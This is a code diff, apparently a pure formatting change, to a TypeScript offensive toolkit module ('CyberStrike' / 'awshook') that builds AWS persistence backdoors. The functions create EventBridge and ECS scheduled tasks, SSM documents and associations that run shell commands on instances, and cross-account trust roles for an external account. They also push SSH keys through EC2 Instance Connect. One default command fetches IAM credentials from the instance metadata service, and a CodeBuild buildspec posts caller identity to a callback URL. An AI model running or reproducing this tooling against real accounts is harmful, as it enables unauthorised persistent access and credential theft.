@@ -158,14 +158,7 @@ export async function eventbridgeBackdoor(args: string[], timeout: number): Prom
   output.push(`[+] Rule created: ${ruleName} (${schedule})`)
 
   const target = await aws(
-    [
-      "events",
-      "put-targets",
-      "--rule",
-      ruleName,
-      "--targets",
-      JSON.stringify([{ Id: "cs-target", Arn: targetArn }]),
-    ],
+    ["events", "put-targets", "--rule", ruleName, "--targets", JSON.stringify([{ Id: "cs-target", Arn: targetArn }])],
     profile,
     region,
     timeout,
@@ -189,7 +182,8 @@ export async function eventbridgeBackdoor(args: string[], timeout: number): Prom
 
 export async function ssmDocumentBackdoor(args: string[], timeout: number): Promise<HookResult> {
   const docName = argVal(args, "--document-name") || `cs-doc-${Date.now().toString(36)}`
-  const command = argVal(args, "--command") || "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  const command =
+    argVal(args, "--command") || "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
   const output: string[] = ["[*] SSM Document Backdoor\n"]
@@ -281,12 +275,7 @@ export async function codebuildBackdoor(args: string[], timeout: number): Promis
   const output: string[] = ["[*] CodeBuild Backdoor\n"]
   const findings: Finding[] = []
 
-  const projects = await aws(
-    ["codebuild", "list-projects", "--query", "projects"],
-    profile,
-    region,
-    timeout,
-  )
+  const projects = await aws(["codebuild", "list-projects", "--query", "projects"], profile, region, timeout)
   if (projects.exitCode === 0) {
     const pl = tryJson(projects.stdout) || []
     output.push(`[+] Existing Projects: ${pl.length}`)
@@ -318,13 +307,17 @@ export async function codebuildBackdoor(args: string[], timeout: number): Promis
     "      - aws sts get-caller-identity",
     "      - env | sort",
     callbackUrl ? `      - curl -s -d \"$(aws sts get-caller-identity)\" ${callbackUrl}` : "",
-  ].filter(Boolean).join("\n")
+  ]
+    .filter(Boolean)
+    .join("\n")
 
   output.push(`[*] Would create CodeBuild project: ${projectName}`)
   output.push(`[*] Service role: ${roleArn}`)
   output.push(`[*] Buildspec:\n${buildspec}`)
   output.push(`\n[*] Create with:`)
-  output.push(`    aws codebuild create-project --name ${projectName} --service-role ${roleArn} --source type=NO_SOURCE,buildspec="${buildspec}" --artifacts type=NO_ARTIFACTS --environment type=LINUX_CONTAINER,computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:7.0`)
+  output.push(
+    `    aws codebuild create-project --name ${projectName} --service-role ${roleArn} --source type=NO_SOURCE,buildspec="${buildspec}" --artifacts type=NO_ARTIFACTS --environment type=LINUX_CONTAINER,computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:7.0`,
+  )
   output.push(`    aws codebuild start-build --project-name ${projectName}`)
 
   findings.push({
@@ -362,7 +355,14 @@ export async function amiBackdoor(args: string[], timeout: number): Promise<Hook
     }
 
     const instances = await aws(
-      ["ec2", "describe-instances", "--query", "Reservations[].Instances[].[InstanceId,InstanceType,State.Name]", "--filters", "Name=instance-state-name,Values=running"],
+      [
+        "ec2",
+        "describe-instances",
+        "--query",
+        "Reservations[].Instances[].[InstanceId,InstanceType,State.Name]",
+        "--filters",
+        "Name=instance-state-name,Values=running",
+      ],
       profile,
       region,
       timeout,
@@ -427,12 +427,7 @@ export async function crossAccountRole(args: string[], timeout: number): Promise
   const findings: Finding[] = []
 
   if (!externalAccount) {
-    const roles = await aws(
-      ["iam", "list-roles", "--query", "Roles[].[RoleName,Arn]"],
-      profile,
-      region,
-      timeout,
-    )
+    const roles = await aws(["iam", "list-roles", "--query", "Roles[].[RoleName,Arn]"], profile, region, timeout)
     if (roles.exitCode === 0) {
       const rl = tryJson(roles.stdout) || []
       const currentId = await aws(["sts", "get-caller-identity", "--query", "Account"], profile, region, timeout)
@@ -471,11 +466,13 @@ export async function crossAccountRole(args: string[], timeout: number): Promise
 
   const trustPolicy = JSON.stringify({
     Version: "2012-10-17",
-    Statement: [{
-      Effect: "Allow",
-      Principal: { AWS: `arn:aws:iam::${externalAccount}:root` },
-      Action: "sts:AssumeRole",
-    }],
+    Statement: [
+      {
+        Effect: "Allow",
+        Principal: { AWS: `arn:aws:iam::${externalAccount}:root` },
+        Action: "sts:AssumeRole",
+      },
+    ],
   })
 
   const create = await aws(
@@ -657,7 +654,19 @@ export async function ec2InstanceConnect(args: string[], timeout: number): Promi
   const output: string[] = ["[*] EC2 Instance Connect — SSH Key Push\n"]
 
   if (!instanceId && !hasFlag(args, "--enum")) {
-    const instances = await aws(["ec2", "describe-instances", "--filters", "Name=instance-state-name,Values=running", "--query", "Reservations[].Instances[].[InstanceId,PublicIpAddress,PrivateIpAddress,PlatformDetails,KeyName]"], profile, region, timeout)
+    const instances = await aws(
+      [
+        "ec2",
+        "describe-instances",
+        "--filters",
+        "Name=instance-state-name,Values=running",
+        "--query",
+        "Reservations[].Instances[].[InstanceId,PublicIpAddress,PrivateIpAddress,PlatformDetails,KeyName]",
+      ],
+      profile,
+      region,
+      timeout,
+    )
     if (instances.exitCode === 0) {
       const il = tryJson(instances.stdout) || []
       output.push(`[+] Running instances: ${il.length}`)
@@ -667,7 +676,22 @@ export async function ec2InstanceConnect(args: string[], timeout: number): Promi
 
       for (const i of il) {
         if (!i[3]?.includes("Windows")) {
-          const check = await aws(["ec2-instance-connect", "send-ssh-public-key", "--instance-id", i[0], "--instance-os-user", osUser, "--ssh-public-key", "ssh-rsa AAAA_dry_run_probe", "--dry-run"], profile, region, timeout)
+          const check = await aws(
+            [
+              "ec2-instance-connect",
+              "send-ssh-public-key",
+              "--instance-id",
+              i[0],
+              "--instance-os-user",
+              osUser,
+              "--ssh-public-key",
+              "ssh-rsa AAAA_dry_run_probe",
+              "--dry-run",
+            ],
+            profile,
+            region,
+            timeout,
+          )
           if (check.stderr.includes("DryRunOperation")) {
             output.push(`  [+] Instance Connect available: ${i[0]}`)
             findings.push({
@@ -691,12 +715,29 @@ export async function ec2InstanceConnect(args: string[], timeout: number): Promi
   if (!instanceId) return { output: output.join("\n") + "\n[-] --instance-id required", findings }
 
   if (!sshKey) {
-    const keyGen = await Bun.spawn(["ssh-keygen", "-t", "rsa", "-b", "2048", "-f", "/tmp/cs-ic-key", "-N", "", "-q"], { stdout: "pipe", stderr: "pipe" }).exited
+    const keyGen = await Bun.spawn(["ssh-keygen", "-t", "rsa", "-b", "2048", "-f", "/tmp/cs-ic-key", "-N", "", "-q"], {
+      stdout: "pipe",
+      stderr: "pipe",
+    }).exited
     if (keyGen === 0) {
       const pubKey = await Bun.file("/tmp/cs-ic-key.pub").text()
       output.push(`[+] Generated temporary key pair: /tmp/cs-ic-key`)
 
-      const push = await aws(["ec2-instance-connect", "send-ssh-public-key", "--instance-id", instanceId, "--instance-os-user", osUser, "--ssh-public-key", pubKey.trim()], profile, region, timeout)
+      const push = await aws(
+        [
+          "ec2-instance-connect",
+          "send-ssh-public-key",
+          "--instance-id",
+          instanceId,
+          "--instance-os-user",
+          osUser,
+          "--ssh-public-key",
+          pubKey.trim(),
+        ],
+        profile,
+        region,
+        timeout,
+      )
       if (push.exitCode === 0) {
         const r = tryJson(push.stdout)
         if (r?.Success) {
@@ -718,7 +759,21 @@ export async function ec2InstanceConnect(args: string[], timeout: number): Promi
       }
     }
   } else {
-    const push = await aws(["ec2-instance-connect", "send-ssh-public-key", "--instance-id", instanceId, "--instance-os-user", osUser, "--ssh-public-key", sshKey], profile, region, timeout)
+    const push = await aws(
+      [
+        "ec2-instance-connect",
+        "send-ssh-public-key",
+        "--instance-id",
+        instanceId,
+        "--instance-os-user",
+        osUser,
+        "--ssh-public-key",
+        sshKey,
+      ],
+      profile,
+      region,
+      timeout,
+    )
     if (push.exitCode === 0 && tryJson(push.stdout)?.Success) {
       output.push(`[+] SSH key pushed — connect within 60s!`)
       findings.push({
@@ -750,7 +805,17 @@ export async function ssmStateManager(args: string[], timeout: number): Promise<
   const output: string[] = ["[*] SSM State Manager — Scheduled Association\n"]
 
   if (hasFlag(args, "--list") || !command) {
-    const assocs = await aws(["ssm", "list-associations", "--query", "Associations[].[AssociationId,Name,AssociationName,ScheduleExpression,Targets,LastExecutionDate]"], profile, region, timeout)
+    const assocs = await aws(
+      [
+        "ssm",
+        "list-associations",
+        "--query",
+        "Associations[].[AssociationId,Name,AssociationName,ScheduleExpression,Targets,LastExecutionDate]",
+      ],
+      profile,
+      region,
+      timeout,
+    )
     if (assocs.exitCode === 0) {
       const al = tryJson(assocs.stdout) || []
       output.push(`[+] Existing associations: ${al.length}`)
@@ -782,15 +847,27 @@ export async function ssmStateManager(args: string[], timeout: number): Promise<
 
   if (!instanceId) return { output: output.join("\n") + "\n[-] --instance-id required", findings }
 
-  const createDoc = await aws([
-    "ssm", "create-association",
-    "--name", "AWS-RunShellScript",
-    "--association-name", assocName,
-    "--targets", `Key=instanceids,Values=${instanceId}`,
-    "--parameters", `commands=["${command.replace(/"/g, '\\"')}"]`,
-    "--schedule-expression", schedule,
-    "--compliance-severity", "UNSPECIFIED",
-  ], profile, region, timeout)
+  const createDoc = await aws(
+    [
+      "ssm",
+      "create-association",
+      "--name",
+      "AWS-RunShellScript",
+      "--association-name",
+      assocName,
+      "--targets",
+      `Key=instanceids,Values=${instanceId}`,
+      "--parameters",
+      `commands=["${command.replace(/"/g, '\\"')}"]`,
+      "--schedule-expression",
+      schedule,
+      "--compliance-severity",
+      "UNSPECIFIED",
+    ],
+    profile,
+    region,
+    timeout,
+  )
 
   if (createDoc.exitCode === 0) {
     const r = tryJson(createDoc.stdout)
@@ -830,7 +907,12 @@ export async function ecsScheduledTask(args: string[], timeout: number): Promise
   const output: string[] = ["[*] ECS Scheduled Task — Serverless Persistence\n"]
 
   if (hasFlag(args, "--list") || !cluster) {
-    const rules = await aws(["events", "list-rules", "--query", "Rules[?starts_with(Name,'cs-ecs')].[Name,ScheduleExpression,State]"], profile, region, timeout)
+    const rules = await aws(
+      ["events", "list-rules", "--query", "Rules[?starts_with(Name,'cs-ecs')].[Name,ScheduleExpression,State]"],
+      profile,
+      region,
+      timeout,
+    )
     if (rules.exitCode === 0) {
       const rl = tryJson(rules.stdout) || []
       if (rl.length) {
@@ -846,7 +928,12 @@ export async function ecsScheduledTask(args: string[], timeout: number): Promise
       for (const c of cl) output.push(`  ${String(c).split("/").pop()}`)
     }
 
-    const taskDefs = await aws(["ecs", "list-task-definitions", "--sort", "DESC", "--max-items", "10", "--query", "taskDefinitionArns"], profile, region, timeout)
+    const taskDefs = await aws(
+      ["ecs", "list-task-definitions", "--sort", "DESC", "--max-items", "10", "--query", "taskDefinitionArns"],
+      profile,
+      region,
+      timeout,
+    )
     if (taskDefs.exitCode === 0) {
       const tl = tryJson(taskDefs.stdout) || []
       output.push(`\n[+] Recent task definitions (latest 10):`)
@@ -854,7 +941,9 @@ export async function ecsScheduledTask(args: string[], timeout: number): Promise
     }
 
     if (!cluster) {
-      output.push("\n[*] Usage: awshook ecs_scheduled_task --cluster NAME --task-definition DEF [--command CMD] [--schedule 'rate(1 hour)']")
+      output.push(
+        "\n[*] Usage: awshook ecs_scheduled_task --cluster NAME --task-definition DEF [--command CMD] [--schedule 'rate(1 hour)']",
+      )
       return { output: output.join("\n"), findings }
     }
   }
@@ -864,7 +953,23 @@ export async function ecsScheduledTask(args: string[], timeout: number): Promise
     return { output: output.join("\n"), findings }
   }
 
-  const ruleCreate = await aws(["events", "put-rule", "--name", ruleName, "--schedule-expression", schedule, "--state", "ENABLED", "--description", "CyberStrike ECS scheduled task"], profile, region, timeout)
+  const ruleCreate = await aws(
+    [
+      "events",
+      "put-rule",
+      "--name",
+      ruleName,
+      "--schedule-expression",
+      schedule,
+      "--state",
+      "ENABLED",
+      "--description",
+      "CyberStrike ECS scheduled task",
+    ],
+    profile,
+    region,
+    timeout,
+  )
   if (ruleCreate.exitCode !== 0) {
     output.push(`[-] Failed to create rule: ${ruleCreate.stderr.trim()}`)
     return { output: output.join("\n"), findings }
@@ -876,11 +981,25 @@ export async function ecsScheduledTask(args: string[], timeout: number): Promise
   output.push(`    ARN: ${ruleArn}`)
 
   const clusterArn = cluster.startsWith("arn:") ? cluster : `arn:aws:ecs:${region || "us-east-1"}:*:cluster/${cluster}`
-  const overrides = command ? `,\"EcsParameters\":{\"TaskDefinitionArn\":\"${taskDef}\",\"TaskCount\":1,\"LaunchType\":\"FARGATE\",\"NetworkConfiguration\":{\"awsvpcConfiguration\":{\"Subnets\":[\"auto\"],\"AssignPublicIp\":\"ENABLED\"}}},\"Input\":\"{\\\"containerOverrides\\\":[{\\\"name\\\":\\\"main\\\",\\\"command\\\":[\\\"sh\\\",\\\"-c\\\",\\\"${command.replace(/"/g, '\\\\"')}\\\"]}]}\"` : ""
+  const overrides = command
+    ? `,\"EcsParameters\":{\"TaskDefinitionArn\":\"${taskDef}\",\"TaskCount\":1,\"LaunchType\":\"FARGATE\",\"NetworkConfiguration\":{\"awsvpcConfiguration\":{\"Subnets\":[\"auto\"],\"AssignPublicIp\":\"ENABLED\"}}},\"Input\":\"{\\\"containerOverrides\\\":[{\\\"name\\\":\\\"main\\\",\\\"command\\\":[\\\"sh\\\",\\\"-c\\\",\\\"${command.replace(/"/g, '\\\\"')}\\\"]}]}\"`
+    : ""
 
   const targetInput = `[{"Id":"cs-target","Arn":"${clusterArn}","RoleArn":"${ruleArn}"${overrides}}]`
 
-  const targetCreate = await aws(["events", "put-targets", "--rule", ruleName, "--targets", `Id=cs-target,Arn=${clusterArn},EcsParameters={TaskDefinitionArn=${taskDef},TaskCount=1,LaunchType=FARGATE}`], profile, region, timeout)
+  const targetCreate = await aws(
+    [
+      "events",
+      "put-targets",
+      "--rule",
+      ruleName,
+      "--targets",
+      `Id=cs-target,Arn=${clusterArn},EcsParameters={TaskDefinitionArn=${taskDef},TaskCount=1,LaunchType=FARGATE}`,
+    ],
+    profile,
+    region,
+    timeout,
+  )
   if (targetCreate.exitCode === 0) {
     output.push(`[+] ECS target attached: ${taskDef}`)
     output.push(`    Cluster: ${cluster}`)
